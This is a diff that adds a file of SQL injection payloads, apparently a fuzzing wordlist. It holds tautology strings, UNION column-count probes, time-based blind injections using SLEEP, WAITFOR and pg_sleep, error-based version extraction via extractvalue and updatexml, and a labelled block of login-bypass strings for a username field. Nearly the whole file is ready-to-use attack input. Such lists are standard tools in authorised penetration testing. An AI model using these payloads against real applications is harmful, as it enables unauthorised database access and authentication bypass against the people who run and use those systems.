@@ -1,0 +1,62 @@
+'
+"
+' OR '1'='1
+" OR "1"="1
+' AND '1'='2
+" AND "1"="2
+1 OR 1=1
+1 AND 1=2
+' OR SLEEP(2)--
+`
+\
+')
+")
+`)
+';
+' --
+'#
+'/*
+' OR '1'='1'-- -
+' OR '1'='1'#
+' OR 1=1-- -
+' OR 1=1#
+" OR 1=1-- -
+' OR 'x'='x
+') OR ('x'='x
+')) OR (('x'='x
+" OR ""="
+' OR ''='
+' OR 1=1 LIMIT 1-- -
+admin'-- -
+admin'#
+admin' OR '1'='1
+1' ORDER BY 1-- -
+1' ORDER BY 10-- -
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+-1' UNION SELECT 1,2,3-- -
+'; WAITFOR DELAY '0:0:5'-- -
+' AND SLEEP(5)-- -
+" AND SLEEP(5)-- -
+' OR SLEEP(5)-- -
+' RLIKE SLEEP(5)-- -
+' OR pg_sleep(5)-- -
+1)) OR SLEEP(5)#
+' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
+' AND extractvalue(1,concat(0x7e,version()))-- -
+' AND updatexml(1,concat(0x7e,version()),1)-- -
+' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+' UNION SELECT @@version-- -
+%27
+%27%20OR%20%271%27%3D%271
+# --- login bypass (inject as the username field value) ---
+administrator'--
+administrator'-- -
+administrator'#
+administrator'/*
+administrator') --
+administrator' OR '1'='1'-- -
+admin'--
+admin'/*
+' OR 1=1 LIMIT 1#
